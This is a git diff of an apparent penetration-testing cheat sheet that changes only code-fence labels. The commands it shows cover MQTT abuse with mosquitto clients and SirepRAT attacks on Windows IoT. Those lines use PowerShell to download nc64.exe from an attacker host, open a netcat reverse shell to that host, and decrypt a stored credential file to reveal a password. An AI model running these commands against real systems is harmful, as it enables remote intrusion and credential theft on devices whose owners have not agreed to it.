@@ -19,22 +19,22 @@
 
 ### Client Tools
 
-```c
+```console
 $ sudo apt-get install mosquitto mosquitto-clients
 ```
 
-```c
+```console
 $ mosquitto_sub -h <RHOST> -t U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub
 $ mosquitto_pub -h <RHOST> -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m 'hello'
 ```
 
 ### Sending Commands
 
-```c
+```console
 { "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls" }
 ```
 
-```c
+```console
 $ mosquitto_pub -h <RHOST> -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m 'eyAiaWQiOiAiY2RkMWIxYzAtMWM0MC00YjBmLThlMjItNjFiMzU3NTQ4YjdkIiwgImNtZCI6ICJDTUQiLCAiYXJnIjogImxzIiB9'
 ```
 
@@ -42,7 +42,7 @@ $ mosquitto_pub -h <RHOST> -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m 'eyAiaWQiO
 
 > https://github.com/bapowell/python-mqtt-client-shell
 
-```c
+```console
 $ python mqtt_client_shell.py
 > host=<RHOST>
 > host <RHOST>
@@ -58,17 +58,17 @@ $ python mqtt_client_shell.py
 
 ### Upload
 
-```c
+```console
 $ python SirepRAT.py <RHOST> LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -Uri http://<LHOST>:80/nc64.exe" --v
 ```
 
 ### Command Execution
 
-```c
+```console
 $ python SirepRAT.py <RHOST> LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe <LHOST> <LPORT> -e powershell.exe" --v
 ```
 
-```c
+```console
 $ $env:UserName                                                        // get the current username
 $ $credential = Import-CliXml -Path U:\Users\administrator\root.txt    // accessing a file
 $ $credential.GetNetworkCredential().Password                          // show input
